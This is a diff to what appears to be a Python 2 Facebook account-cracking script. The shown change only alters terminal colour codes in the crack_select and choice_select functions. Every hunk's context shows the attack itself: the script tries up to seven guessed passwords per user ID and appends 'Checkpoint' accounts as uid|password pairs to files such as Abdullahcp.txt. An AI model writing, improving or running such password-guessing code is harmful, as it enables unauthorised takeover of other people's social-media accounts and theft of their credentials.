@@ -353,7 +353,7 @@ def crack_select():
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print ' \x1b[1;21m [Checkpoint] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('Asghar.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -369,7 +369,7 @@ def crack_select():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print ' \x1b[1;21m [Checkpoint] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('Abdullahcp.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -385,7 +385,7 @@ def crack_select():
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print ' \x1b[1;21m [Checkpoint] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('Abdullahcp.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
@@ -401,7 +401,7 @@ def crack_select():
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print ' \x1b[1;21m [Checkpoint] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('Abdullahcp.txt', 'a')
                             cp.write(uid + '|' + pass4 + '\n')
                             cp.close()
@@ -417,7 +417,7 @@ def crack_select():
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print ' \x1b[1;21m [Checkpoint] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 cp = open('Abdullahcp.txt', 'a')
                                 cp.write(uid + '|' + pass5 + '\n')
                                 cp.close()
@@ -433,7 +433,7 @@ def crack_select():
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print ' \x1b[1;21m [Checkpoint] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     cp = open('Abdullahcp.txt', 'a')
                                     cp.write(uid + '|' + pass6 + '\n')
                                     cp.close()
@@ -449,7 +449,7 @@ def crack_select():
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print ' \x1b[1;21m [Checkpoint] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         cp = open('Abdullahcp.txt', 'a')
                                         cp.write(uid + '|' + pass7 + '\n')
                                         cp.close()
@@ -755,7 +755,7 @@ def choice_select():
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print ' \x1b[1;28m [Checkpoint] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('Abdullahcp.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -770,7 +770,7 @@ def choice_select():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print ' \x1b[1;28m [Checkpoint] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('Abdullahcp.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -785,7 +785,7 @@ def choice_select():
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print ' \x1b[1;28m [Checkpoint] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('Abdullahcp.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
@@ -800,7 +800,7 @@ def choice_select():
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print ' \x1b[1;28m [Checkpoint] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('Abdullahcp.txt', 'a')
                             cp.write(uid + '|' + pass4 + '\n')
                             cp.close()
@@ -815,7 +815,7 @@ def choice_select():
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print ' \x1b[1;328m [Checkpoint] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 cp = open('Abdullahcp.txt', 'a')
                                 cp.write(uid + '|' + pass5 + '\n')
                                 cp.close()
@@ -830,7 +830,7 @@ def choice_select():
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print ' \x1b[1;28m [Checkpoint] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     cp = open('Abdullahcp.txt', 'a')
                                     cp.write(uid + '|' + pass6 + '\n')
                                     cp.close()
@@ -845,7 +845,7 @@ def choice_select():
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print ' \x1b[1;28m [Checkpoint] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;31m [Checkpoint] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         cp = open('Abdullahcp.txt', 'a')
                                         cp.write(uid + '|' + pass7 + '\n')
                                         cp.close()
